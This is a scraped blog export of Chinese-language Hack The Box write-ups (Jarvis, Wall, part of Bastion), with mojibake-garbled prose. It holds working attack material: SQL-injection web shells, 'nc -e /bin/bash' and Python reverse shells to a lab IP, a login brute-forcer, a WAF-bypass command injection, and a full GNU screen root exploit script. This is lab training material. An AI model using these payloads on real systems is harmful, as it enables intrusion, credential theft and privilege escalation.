Writeup","slug":"HTB-jarvis","date":"2020-01-21T16:00:00.000Z","updated":"2023-11-29T13:16:30.933Z","comments":true,"path":"2020/01/22/HTB-jarvis/","permalink":"https://ik0nw.github.io/2020/01/22/HTB-jarvis/","excerpt":"","text":"æŒºæœ‰æ„æ€çš„ä¸€å°æœºå™¨ï¼Œæœ‰æŒºå¤šç§æ–¹å¼æ‹¿ low priv shellã€‚ æ”»å‡»æœºï¼šå®˜æ–¹Kali linux 2019 64ä½ä½œè€…ï¼šIkonw é¶æœºä»‹ç» ä¸€ï¼Œç«¯å£æ‰«æåªæœ‰HTTP æ¯”è¾ƒæœ‰å…´è¶£ï¼Œtitle æ˜¯ Stark Hotel Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-22 11:48 +08Nmap scan report for jarvis.htb (10.10.10.143)Host is up (0.33s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: | 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)| 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)|_ 256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)80/tcp open http Apache httpd 2.4.25 ((Debian))| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Stark HotelService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel123456789101112131415161718 äºŒï¼ŒHTTP Enumerationç¬¬ä¸€ä¸ªä¹ æƒ¯å°±æ˜¯å…ˆæŠŠgobuster ä¸Šèµ·æ¥ gobuster dir -w directory-list-2.3-medium.txt -u 10.10.10.143 -t 501 å‘ç°æœ‰ phpmyadminç»è¿‡ä¸€ç•ªå°è¯•ï¼Œdefault è´¦å·å’Œå¯†ç éƒ½æ— æ•ˆã€‚æš‚æ—¶å…ˆè·³è¿‡ã€‚ ç»§ç»­æµè§ˆ stark hotel(é’¢é“ä¾ çˆ±å¥½è€…ï¼Œstark å’Œ jarvis) åœ¨ç½‘é¡µä¸Šå‘ç°å‡ å¤„å¯ç–‘çš„åŸŸå supersecurehotel.htblogger.htb å°è¯•ç€åŠ è¿›å» &#x2F;etc&#x2F;hosts 10.10.10.143 jarvis.htb supersecurehotel@logger.htb supersecurehotel.htb logger.htb1 ç„¶ååˆ†åˆ«ç”¨ jarvis.htb, supersecurehotel.htb, logger.htb ç­‰åŸŸåè¿›è¡Œè®¿é—®ã€‚ ç»“æœè¿˜æ˜¯è·Ÿä¹‹å‰ä¸€æ ·çš„ å¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚æˆ‘ä»¬æ¥ç€æ¢ç´¢ã€‚ ä¸€é¡¿èƒ¡ä¹±ç‚¹å‡»å å‘ç° room.php æœ‰å¯ç–‘å°è¯•åŠ ä¸ªåŒå¼•å·å¼•å· â€œ http://10.10.10.143/room.php?cod=1&quot;1 æœç„¶æŠ¥é”™äº†ä¸‹ä¸€æ­¥ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ ORDER BY æˆ–è€… UNION SELECTæ¥æ‰¾å‡ºæŸ¥è¯¢è¯­å¥æœ‰å‡ ä¸ªå­—æ®µã€‚ ORDER BY é¦–å…ˆä½¿ç”¨orderbyå­å¥æ¥ç¡®å®šSQLè¯­å¥æŸ¥è¯¢çš„å­—æ®µæ•°é‡ã€‚orderbyå­å¥ä¼šæ ¹æ®sqlæŸ¥è¯¢ç»“æœçš„å­—æ®µæ¥æ’åºï¼Œå¦‚æœå­—æ®µä¸å­˜åœ¨åˆ™ä¼šæŠ¥é”™ã€‚ å¯ä»¥å…ˆä»10 å¼€å§‹è¯• http://10.10.10.143/room.php?cod=1 ORDER BY 101 é¡µé¢æ˜¾ç¤ºåå¸¸ï¼Œä»£è¡¨æ²¡æœ‰10ä¸ªå­—æ®µï¼Œ ä¸€ä¸ªä¸€ä¸ªæ…¢æ…¢ä¸‹è¯•è¯•åˆ°ç¬¬7çš„æ—¶å€™ é¡µé¢æ­£å¸¸è¿”å› http://10.10.10.143/room.php?cod=1 ORDER BY 71 ç¡®è®¤äº† æœ‰7ä¸ªå­—æ®µç´§æ¥ç€ æˆ‘ä»¬èƒ½ä½¿ç”¨ UNION SELECTæ¥ç¡®å®šå›æ˜¾ä½ http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,3,4,5,6,71 å¯ä»¥ç¡®å®š 1 åº”è¯¥æ˜¯IDï¼Œæ‰€ä»¥æ²¡æœ‰æ˜¾ç¤ºã€‚2 æ˜¯ è¯„åˆ†ç­‰çº§3 æ˜¯ ä»·é’±4 æ˜¯ ä»‹ç»5 æ˜¯ å›¾ç‰‡6 å’Œ 7 æ˜¯æœªçŸ¥ã€‚ å½“ç„¶è¿™äº›éƒ½ä¸é‡è¦ é‡è¦çš„æ˜¯ å›æ˜¾ä½æˆ‘ä»¬èƒ½çœ‹åˆ°ã€‚ å¯ä»¥åˆ©ç”¨mysqlçš„ä¸€äº›å‡½æ•°æ¥è·å–æ›´å¤šä¿¡æ¯ã€‚ æ¯”å¦‚database()æ•°æ®åº“çš„åå­—å«hotel http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,database(),4,5,6,71 ä¸‰ï¼Œæ‹¿shellæˆ‘ä»¬æœ‰ä¸¤ç§æ–¹å¼æ¥æ‹¿åˆ° www-dataã€‚ä¸€ç§ä¸ºåˆ©ç”¨mysqlè¯»å†™çš„æ–¹å¼æ³¨å…¥phpæ‰§è¡Œnc SELECT ... INTO OUTFILE &#x27;file_name&#x27;1http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,&#x27;&lt;?php system(&quot;nc -e /bin/bash 10.10.14.10 1234&quot;);?&gt;&#x27;,4,5,6,7 INTO OUTFILE &#x27;/var/www/html/malicious.php&#x27;1 ç„¶åæˆ‘ä»¬è®¿é—® 10.10.10.143&#x2F;malicious.phpæˆåŠŸæ‹¿åˆ° shell ç¬¬äºŒç§æ–¹å¼æ˜¯é€šè¿‡ mysqlå‡½æ•°å¯¼å‡º æ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç  ç™»é™†phpmyadmin. ä½¿ç”¨ group_concat å¯ä»¥æŠŠ åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥,è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœ åˆ©ç”¨ â€œ:â€ æ¥éš”ç¦»åˆ†å¼€ room.php?cod=999 union select 1,2,(select group_concat(user,&quot;:&quot;,password,&quot;:&quot;,host) from mysql.user),4,5,6,71 æˆ‘ä»¬æˆåŠŸå–å¾— æ•°æ®åº“çš„è´¦å·å’Œå¯†ç å“ˆå¸Œå€¼ Dbadmin:2D2B7A5E4E637B8FBA1D17F40318F277D29964D0åˆ©ç”¨ crackstation.net æ¥è¿›è¡Œç ´è§£å“ˆå¸Œå€¼å¾—åˆ°å¯†ç  imissyou æ‰¾å›ä¹‹å‰çš„ phpmyadmin ç™»é™†åå‘ç°Apache&#x2F;2.4.25phpmyadmin 4.8.0æ–‡ç« å‘è¡¨çš„æ—¶å€™ phpmyadmin æœ€æ–°çš„ç‰ˆæœ¬ä¸º 5.0.1ä¸€ç•ªsearchsploitåå‘ç° 4.8.0å’Œ4.8.1 ç‰ˆæœ¬æœ‰è¿œç¨‹æ‰§è¡Œæ–‡ä»¶åŒ…å«æ¼æ´ phpmyadmin 4.8 æ–‡ä»¶åŒ…å«æ¼æ´ä¼ é€é—¨ é¦–å…ˆ è¿è¡Œsqlå‘½ä»¤ select &#x27;&lt;?php system(&quot;nc -e /bin/bash 10.10.14.12 1234&quot;);?&gt;&#x27;1 æ‹¿åˆ°sessionçš„æ•°å€¼ç„¶åè¿›è¡Œè®¿é—® 10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_b6uigkomnmk4oaa91ckc4chk4nfahaqi1 æˆåŠŸï¼ å››ï¼Œæé«˜ç”¨æˆ·æƒé™ç¬¬ä¸€ä»¶äº‹æƒ…å°±æ˜¯è¯•è¯• sudo -l æœ‰æ²¡æœ‰ä»»ä½•å¯ä»¥åˆ©ç”¨çš„æƒé™ã€‚ Matching Defaults entries for www-data on jarvis: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser www-data may run the following commands on jarvis: (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py1234567 è¿™æ˜¯ä¸€ä¸ªå°å‹çš„è­¦æŠ¥å™¨ä»”ç»†çœ‹äº†æºä»£ç ï¼Œæœ‰ä¸€ä¸ªåœ°æ–¹å¯ä»¥ä½¿ç”¨å‘½ä»¤æ³¨å…¥ï¼Œè™½ç„¶åšäº†ç‚¹é»‘åå•æ¥è¿‡æ»¤ã€‚ ä½†æ˜¯ç”±äº $ è¿˜èƒ½ä½¿ç”¨ã€‚ æˆ‘ä»¬å¯ä»¥ç”¨ç±»ä¼¼ $(cmd) çš„æ“ä½œã€‚ sudo -u pepper /var/www/Admin-Utilities/simpler.py -pEnter an IP: $(bash)12 æˆ‘ä»¬æˆåŠŸæ‹¿åˆ°pepperçš„shellè¿™é‡Œä¸æ‡‚å‡ºäºä»€ä¹ˆåŸå›  æˆ‘å„ç§å‘½ä»¤å…¨éƒ¨éƒ½æ²¡å“åº”ã€‚äºæ˜¯æˆ‘ç”¨nc é‡æ–°ç”Ÿæˆäº†ä¸€ä¸ªshell pepper@jarvis:/$nc -e /bin/bash 10.10.14.10 1234nc -e /bin/bash 10.10.14.10 1234123 äºæ˜¯æˆ‘ä»¬æˆåŠŸæ‹¿åˆ°pepper çš„æƒé™ äº”ï¼ŒROOTææƒé¦–å…ˆæˆ‘ä»¬æ¥æŸ¥çœ‹SUID files find / -perm -4000 2&gt;/dev/null1 å‘ç° systemctl æ¯”è¾ƒå¯ç–‘ã€‚é€šè¿‡ gtfobins å‘ç°å­˜åœ¨SUID æ¥è¿›è¡Œææƒçš„æ–¹æ³•ã€‚ä¸€èˆ¬çœ‹åˆ°è¿™ç§æˆ‘éƒ½æ¯”è¾ƒå–œæ¬¢æ‰‹åŠ¨æ“ä½œã€‚åˆ›å»ºä¸€ä¸ª pwn.service åœ¨ pepper çš„ä¸»ç›®å½•é‡Œ å¹¶ä¸”æŠŠ ExecStart æŒ‡å‘ nc.sh [Service]Type=oneshotExecStart=/home/pepper/nc.sh[Install]WantedBy=multi-user.target123456#!/bin/bashnc -e /bin/bash 10.10.14.10 1234123 ç„¶åæˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ª symlink èµ·æ¥ systemctl link /home/pepper/pwn.service1 æ‰“å¼€ nc æ¥å¬ ç„¶åå¯åŠ¨æˆ‘ä»¬çš„pwnæœåŠ¡ systemctl start pwn1 æˆ‘ä»¬æˆåŠŸæ‹¿åˆ°root","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"}]},{"title":"HTB Wall Writeup","slug":"HTB-wall","date":"2020-01-12T16:00:00.000Z","updated":"2023-11-29T13:19:56.121Z","comments":true,"path":"2020/01/13/HTB-wall/","permalink":"https://ik0nw.github.io/2020/01/13/HTB-wall/","excerpt":"è¿™å°æœºå™¨æ¯”è¾ƒæœ‰æ„æ€ï¼Œæ­£å¦‚åå­— æœ‰ä¸€é“â€œå¢™â€ã€‚æœ‰è¶£çš„æ˜¯è¿™å°æœºå™¨çš„CMS CVEå’Œæœºå™¨çš„ä½œè€…æ˜¯åŒä¸€ä¸ªäººã€‚ä½œè€…å°½é‡å†™å‡ºè‡ªå·±åœ¨é‡åˆ°é—®é¢˜çš„æ—¶å€™ç¢°åˆ°çš„å‘ ä»¥åŠåšäº†ä»€ä¹ˆå°è¯•å’Œæ€è·¯ã€‚","text":"è¿™å°æœºå™¨æ¯”è¾ƒæœ‰æ„æ€ï¼Œæ­£å¦‚åå­— æœ‰ä¸€é“â€œå¢™â€ã€‚æœ‰è¶£çš„æ˜¯è¿™å°æœºå™¨çš„CMS CVEå’Œæœºå™¨çš„ä½œè€…æ˜¯åŒä¸€ä¸ªäººã€‚ä½œè€…å°½é‡å†™å‡ºè‡ªå·±åœ¨é‡åˆ°é—®é¢˜çš„æ—¶å€™ç¢°åˆ°çš„å‘ ä»¥åŠåšäº†ä»€ä¹ˆå°è¯•å’Œæ€è·¯ã€‚ æ”»å‡»æœºï¼šå®˜æ–¹Kali linux 2019 64ä½ä½œè€…ï¼šIkonw é¶æœºä»‹ç» ä¸€ï¼Œç«¯å£æ‰«ææ­£å¸¸çš„nmapç«¯å£æ‰«æ æ²¡æœ‰å¤ªå¤šä¿¡æ¯ã€‚ 22 SSH å’Œç«¯å£ 80 web æœåŠ¡ äºŒï¼Œç½‘é¡µç›®å½•çˆ†ç ´æˆ‘æ¯”è¾ƒå–œæ¬¢ç”¨gobusterï¼Œæ¥è¿›è¡Œç›®å½•çˆ†ç ´ã€‚å¦‚æœæ²¡æœ‰ è¯·è‡ªè¡Œå®‰è£… sudo apt-get install gobuster1 æˆ‘å¸¸ç”¨çš„å­—å…¸æ˜¯ç”¨ directory-list-2.3-medium.txtæ‰¾åˆ°ç›®å½• &#x2F;monitoring å‘ç°æœ‰ä¸ªHTTPåŸºç¡€è®¤è¯(HTTP Basic Authentication) ä¸‰ï¼Œå¯¹åŸºç¡€è®¤è¯è¿›è¡Œè¯•éªŒç”±äºgobuster æ²¡æœ‰æ‰«åˆ°ä»€ä¹ˆå…¶ä»–ç›®å½•ï¼Œäºæ˜¯æˆ‘æŠŠç›®æ ‡æ”¾åœ¨è¿™åŸºç¡€è®¤è¯ã€‚ é¦–å…ˆæˆ‘å°è¯•æ˜¯å¦å¯ä»¥hydra æ¥è¿›è¡Œçˆ†ç ´å¯†ç ã€‚ hydra -l admin -P Most-Popular-Letter-Passes.txt 10.10.10.157 http-get /monitoring -t 301 å¦‚ä½•ä½¿ç”¨hydra æˆ‘å°±ä¸ä»”ç»†æ•™å­¦äº†ï¼Œè¿™é‡Œæœ‰ä¸€ç¯‡å¾ˆå¥½çš„æ–‡ç« è®²è§£å„ç§hydra é€‰é¡¹ä¼ é€é—¨ hydraè·‘å®Œå æˆ‘è¿˜æ˜¯æ²¡æœ‰æ‹¿åˆ°å¯†ç ã€‚äºæ˜¯æˆ‘æŠŠ http-get æ¢æˆ http-post å°è¯• hydra -l admin -P Most-Popular-Letter-Passes.txt 10.10.10.157 http-post /monitoring -t 301 æœ‰æ„æ€çš„æ˜¯å±…ç„¶æ¯ä¸€ä¸ªå¯†ç éƒ½èƒ½é€šè¿‡ã€‚ç°åœ¨æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨burp suiteæ›´æ”¹è¯·æ±‚ã€‚ä»GETæ¢å»POSTã€‚ç„¶åæˆ‘ä»¬è¢«è·³è½¬åˆ° &#x2F;centreon è¿™é‡Œç®€å•çš„æŠ“åŒ…ä¸‹çœ‹ ç™»é™†çš„è¿‡ç¨‹ã€‚ æœ‰ANTI-CSRF TOKENæ‰€ä»¥æ²¡åŠæ³•çˆ†ç ´ã€‚æˆ‘ä»¬ä»ç™»é™†é¡µé¢å‘ç°centreon ç‰ˆæœ¬ä¸º v.19.04.0 edbé“¾æ¥ å››ï¼Œä¿®æ”¹Exploitå…ˆæ¥èŠèŠè¿™ä¸ªexploit çš„ pythonæ–‡ä»¶éƒ½å¹²äº†ä»€ä¹ˆã€‚è¿™ä¸ªexploit æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¸€ä¸ªæ˜¯ç™»é™† ä¸€ä¸ªæ˜¯åˆ©ç”¨äº†å‘½ä»¤æ³¨å…¥ ç™»é™†çš„éƒ¨åˆ†åˆ©ç”¨beautiful soupæ¥æŠ“å»é¡µé¢çš„ tokenã€‚ç„¶ååˆ©ç”¨æä¾›çš„APIè¿›è¡Œç™»é™†ã€‚é‚£ä¹ˆæœ‰æ„æ€çš„åœ°æ–¹å°±åœ¨è¿™é‡Œæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ç¨å¾®ä¿®æ”¹ä¸‹ è®©è¿™éƒ¨åˆ†å˜æˆå¯†ç çˆ†ç ´ã€‚è¿™é‡Œé»˜è®¤å¸å·æ˜¯ admin å¯†ç å­—å…¸ä¸º rockyou.txt import requestsimport sysimport warningsfrom bs4 import BeautifulSoupwith open(&quot;/usr/share/wordlists/rockyou.txt&quot;,&quot;r&quot;) as dict: for password in dict: request = requests.session() print(&quot;[+] Retrieving CSRF token to submit the login form&quot;) page = request.get(&quot;http://10.10.10.157/centreon&quot;+&quot;/index.php&quot;) html_content = page.text soup = BeautifulSoup(html_content) token = soup.findAll(&#x27;input&#x27;)[3].get(&quot;value&quot;) login_info = &#123; &quot;useralias&quot;: &quot;admin&quot;, &quot;password&quot;: password.strip(), &quot;submitLogin&quot;: &quot;Connect&quot;, &quot;centreon_token&quot;: token &#125; login_request = request.post(&quot;http://10.10.10.157/centreon&quot;+&quot;/index.php&quot;, login_info) print(login_info) if &quot;Your credentials are incorrect.&quot; not in login_request.text: print(&quot;[+] Crackedddddddddddddddddd password = &#123;0&#125;&quot;.format(password.strip())) break12345678910111213141516171819202122232425 æ‰§è¡Œåå¤§çº¦è¿‡äº†åå‡ ç§’ æˆ‘ä»¬æˆåŠŸå–å¾—å¯†ç ï¼ˆè¿™å¯†ç ä¹Ÿå¤ªå¼±äº†ï¼‰admin:password1 äº”ï¼Œç»•è¿‡WAFç°åœ¨æˆ‘ä»¬æœ‰äº†å¯†ç å’Œå¸å·ï¼Œæˆ‘å¯ä»¥æ¥å®éªŒçœ‹çœ‹åŸç‰ˆçš„POCèƒ½ä¸èƒ½è®©æˆ‘ä»¬ç›´æ¥å–å¾—Shellã€‚ python 47069.py http://10.10.10.157/centreon admin password1 10.10.14.22 443nc -nvlp 44312 ä¸€ç‚¹åŠ¨é™éƒ½æ²¡æœ‰ï¼æ²¡äº‹ è®©æˆ‘ä»¬ä»”ç»†è¯»è¯»ç¬¬äºŒä¸ªéƒ¨åˆ†çš„å‘½ä»¤æ³¨å…¥ æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨æ³¨å…¥å‘½ä»¤ï¼ ä»exploit ä¸Šå¯ä»¥å¾—çŸ¥ nagios_bin è¿™é€‰é¡¹å¯ä»¥è®©æˆ‘ä»¬ç›´æ¥æ‰§è¡Œè¿œç¨‹å‘½ä»¤ æƒ³æ›´äº†è§£è¿™ä¸ªExploitå½¢æˆçš„å¯ä»¥çœ‹ä½œè€…çš„å¸–å­ ä¼ é€é—¨è®¿é—®URLåå¹¶ä¸”ç”¨burp suiteæŠ“åŒ… ç„¶å ctrl+r å‘å»repeateræ‰‹åŠ¨è¿›è¡Œæ›´æ¢ ä¸€èˆ¬é‡ä¸Šå¯ä»¥è¿œç¨‹æ‰§è¡Œå‘½ä»¤çš„é—®é¢˜æ—¶å¯ä»¥å°è¯•ç”¨ping wget curl æ¥åˆ¤æ–­æ˜¯å¦å¯ä»¥è¿œç¨‹æ‰§è¡Œã€‚å› ä¸ºè¿™äº›å‘½ä»¤éƒ½ä¼šä¸æœ¬åœ°è¿›è¡Œäº¤äº’ å¹¶ä¸”å¯ä»¥æŸ¥è¯¢åˆ°è®°å½•ã€‚ é¦–å…ˆ å…ˆæµ‹è¯•èƒ½ä¸èƒ½pingnagios_bin&#x3D;ping+10.10.14.12(è‡ªå·±KALIçš„IP)ç„¶ååœ¨æœ¬åœ°ä¸Šå¼€å¯tcpdumpæ¥ç›‘å¬ICMPç”¨ -i æ¥é€‰æ‹©ç›‘å¬çš„interface tcpdump -i tun0 icmp1 æ­å»ºå¥½ç¯å¢ƒå é€‰æ‹©sendï¼Œç»“æœå´æ˜¯forbidden 403ã€‚æ— æ³•è®¿é—®ï¼Œè¿™é‡Œå°±æ˜¯â€œå¢™â€ å‡ºç°çš„åœ°æ–¹äº†ã€‚ è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨åˆ°é¡µé¢è¿›è¡Œæµ‹è¯•ï¼Œä»a~z ç„¶åå„ç§ç¬¦å·ã€‚æœ€ç»ˆå‘ç°ä»»ä½•å­—æ¯éƒ½æ²¡é—®é¢˜ï¼Œé™¤äº† ç©ºæ ¼ä¼šè§¦å‘ 403 forbiddenã€‚æˆ‘ä»¬å¯ä»¥ç”¨ ${IFS} æ¥ä»£æ›¿ç©ºæ ¼ã€‚ ç»“æœtcpdump è¿˜æ˜¯æ²¡æœ‰ä»»ä½•ç»“æœã€‚æ²¡å…³ç³»ï¼Œä¸ºäº†æ›´è¿›ä¸€æ­¥å®éªŒ æˆ‘ä»¬å¯ä»¥å°è¯• wgetã€‚æ‰“å¼€ä¸€ä¸ªweb æœåŠ¡ï¼ˆå¯ä»¥ä½¿ç”¨service apache2 start æˆ–è€… python3 -m http.server 80ï¼‰ â€œnagios_binâ€: â€œwget${IFS}10.10.14.12â€ æˆ‘ä»¬æˆåŠŸä»å‘ç°äº† log é‡Œé¢è¿”å›äº† wall å‘æœ¬åœ°æŠ“å»index.phpè¯å®äº† å‘½ä»¤æ³¨å…¥å¯ä»¥ç»è¿‡ä¸€ç•ªæŠ˜è…¾ï¼Œ ä¸Šä¼ äº†å„ç§php,bash shellã€‚åªæœ‰python shellå¯ä»¥ä½¿ç”¨ä¸Šä¼ åï¼Œåˆ©ç”¨python æ‰§è¡Œ python shellæ–‡ä»¶ã€‚ import socketimport subprocessimport oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;10.10.14.12&quot;,443)) //æ›¿æ¢è¿™é‡Œæˆä½ çš„ipå’Œç«¯å£os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)import ptypty.spawn(&quot;/bin/bash&quot;)1234567891011 å…­ï¼Œææƒææƒç›¸å¯¹å®¹æ˜“å‘ç°ã€‚é¦–å…ˆæŸ¥çœ‹ SUIDæ–‡ä»¶ã€‚å‘ç°å¯ç–‘çš„ screen-4.5.0 find / -perm -4000 2&gt;/dev/null1 è°·æ­Œä¸€ä¸‹ å‘ç°äº†ææƒæ¼æ´ ä¼ é€é—¨ ä¸ªäººä¹ æƒ¯çœ‹åˆ°è¿™ç§éœ€è¦ç¼–è¯‘çš„æ¼æ´éƒ½å–œæ¬¢åœ¨æœ¬åœ°ç¼–è¯‘å¥½äº†å†ä¼ è¾“è¿‡å»ã€‚ç›´æ¥æ‰§è¡Œè¿™æ–‡ä»¶ä¼šå‡ºç°æœªçŸ¥é”™è¯¯ã€‚ä¿é™©èµ·è§ æˆ‘ä»¬æ‰‹åŠ¨æŠŠæ“ä½œ #!/bin/bashecho &quot;~ gnu/screenroot ~&quot;echo &quot;[+] First, we create our shell and library...&quot;cat &lt;&lt; EOF &gt; /tmp/libhax.c#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void)&#123; chown(&quot;/tmp/rootshell&quot;, 0, 0); chmod(&quot;/tmp/rootshell&quot;, 04755); unlink(&quot;/etc/ld.so.preload&quot;); printf(&quot;[+] done!/n&quot;);&#125;EOFgcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.crm -f /tmp/libhax.ccat &lt;&lt; EOF &gt; /tmp/rootshell.c#include &lt;stdio.h&gt;int main(void)&#123; setuid(0); setgid(0); seteuid(0); setegid(0); execvp(&quot;/bin/sh&quot;, NULL, NULL);&#125;EOFgcc -o /tmp/rootshell /tmp/rootshell.crm -f /tmp/rootshell.cecho &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne &quot;/x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so... /tmp/rootshell123456789101112131415161718192021222324252627282930313233343536 æ‰‹åŠ¨æ“ä½œå¥½å ä¼šå‡ºç°ä¸¤ä¸ªæ–‡ä»¶ åˆ©ç”¨wget ä¼ è¾“åˆ° &#x2F;tmpç„¶å cd /etcumask 000screen -D -m -L ld.so.preload echo -ne &quot;/x0a/tmp/libhax.so&quot;ç„¶åæ‰§è¡Œ /tmp/rootshell1234","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"}]},{"title":"HTB Bastion Writeup","slug":"HTB-bastion","date":"2020-01-09T16:00:00.000Z","updated":"2023-11-29T13:14:49.879Z","comments":true,"path":"2020/01/10/HTB-bastion/","permalink":"https://ik0nw.github.io/2020/01/10/HTB-bastion/","excerpt":"","text":"æ”»å‡»æœºï¼šå®˜æ–¹Kali linux 2019 64ä½ä½œè€…: Ikonw ä¸€ï¼Œç«¯å£æ‰«æ æ­£å¸¸çš„nmapç«¯å£æ‰«æ æ²¡æœ‰å¤ªå¤šçš„èµ„è®¯ï¼Œåªæœ‰SMBå’ŒSSH å¼€ç€ã€‚ äºŒï¼ŒSMB Enumerationé¦–å…ˆï¼Œåˆ©ç”¨smbclient è¿æ¥åˆ°é¶æœºæ–¹å¼æœ‰å¾ˆå¤šç§ï¼Œ smbmapä¹‹ç±»çš„ ä½†æˆ‘æ¯”è¾ƒå–œæ¬¢ç”¨ç®€å•çš„smbclient.smbmapç­‰å…¶ä»–å·¥å…·åœ¨çœŸå®ç¯å¢ƒé‡Œ ä¼šè‡ªåŠ¨è¿›è¡Œå¤§é‡æ“ä½œï¼Œå¾ˆå®¹æ˜“è¢«æ—¥å¿—æ•æ‰ä¸‹æ¥ã€‚ smbclient -L //10.10.10.134 å‘ç°å››ä¸ªç›®æ ‡ï¼Œå…¶ä¸­ä¸‰ä¸ªæ˜¯æ¯”è¾ƒæ­£å¸¸ã€‚æœ‰æ„æ€çš„æ˜¯ Backups æˆ‘ä»¬åˆ©ç”¨smbclient çœ‹çœ‹æ˜¯å¦å…è®¸æˆ‘ä»¬è¿æ¥åˆ° Backups smbclient \\\\\\\\10.10.10.134\\\\Backups è¿™é‡Œåˆ©ç”¨â€â€æ¥ é€ƒè„± â€œâ€ æ‰€ä»¥éœ€è¦4ä¸ªï¼Œè€Œbackup ä¸¤ä¸ªã€‚ æˆåŠŸè¿›å…¥ï¼Œå‘ç°ä¸‰ä¸ªæ–‡ä»¶ã€‚åˆ©ç”¨ get æŠŠ note.txt ä¸‹è½½åˆ°æœ¬åœ°ã€‚å¤§æ¦‚çš„æ„æ€å°±æ˜¯ ç³»ç»Ÿç®¡ç†å‘˜å»ºè®®ä¸è¦æŠŠæ•´ä¸ªbackup æ–‡ä»¶å¤¹ä¸‹è½½åˆ°æœ¬åœ°ã€‚æŒ‰ç…§æ–‡ä»¶å¤¹çš„åå­—æ¥çœ‹ï¼Œåº”è¯¥æ˜¯windowsé•œåƒçš„å¤‡ä»½ã€‚ äºæ˜¯æˆ‘å°è¯•å°†æ•´ä¸ªbackupéƒ½æŒ‚è½½åˆ°æœ¬åœ°ã€‚åœ¨æœ¬åœ°åˆ›å»ºæ–‡ä»¶å¤¹ &#x2F;mnt&#x2F;backup mount -t cifs //10.10.10.134/Backups /mnt/backup -o rw æŒ‚è½½åˆ°æœ¬åœ°å¹¶ä¸”å…è®¸è¯»å†™æ“ä½œ 7z æœ‰ä¸€ä¸ªåŠŸèƒ½æ˜¯å¯ä»¥è®©ä½ ç›´æ¥è¯»å– vhdæ–‡ä»¶çš„æ ¼å¼ã€‚æˆ‘ä»¬ç›´æ¥æ¥è¯»å–5gbçš„æ–‡ä»¶(æ–‡ä»¶è¾ƒå¤§ å¤§æ¦‚2åˆ†é’Ÿå·¦å³ï¼Œ æ–‡ä»¶è¾ƒå¤šå°±åªå±•ç¤ºä¸€éƒ¨åˆ†ï¼‰ 7z l 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd å¯ä»¥çœ‹åˆ°è¿™æ˜¯å‡ ä¹æ•´ä¸ªwindowsçš„å¤‡ä»½ã€‚æ—¢ç„¶æ˜¯windowså¤‡ä»½ æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ä»SAM Fileé‡Œé¢ç›´æ¥æå–ç”¨æˆ·çš„å¸å·å¯†ç å‘¢ ä¸‰ï¼Œç”¨æˆ·å¸å·å¯†ç 7z åªæ˜¯è®©æˆ‘ä»¬çœ‹åˆ°äº†æ–‡ä»¶ï¼Œè€Œä¸èƒ½çœ‹åˆ°å†…å®¹ã€‚æˆ‘ç¨å¾®google äº†ä¸€ä¸‹ï¼Œå‘ç°ä¸€ä¸ªå…„å¼Ÿåœ¨mediumä¸Šé¢æœ‰ç¯‡æ–‡ç« åˆ©ç”¨ghost-mountæŒ‚è½½è™šæ‹Ÿç¡¬ç›˜ã€‚linuxçš„ ghostmount èƒ½è®©æˆ‘ä»¬è¿›å…¥è™šæ‹Ÿç¡¬ç›˜çš„æ–‡ä»¶ é“¾æ¥: æ–‡ç« åœ°å€ è·Ÿç€å¤§å“¥èµ°é¦–å…ˆæˆ‘ä»¬éœ€è¦å®‰è£… libguestfs-toolsè¿™ä¸ªåº“ apt-get install libguestfs-tools ç®€å•çš„å®‰è£…åï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶å¤¹ &#x2F;mnt&#x2F;vhd 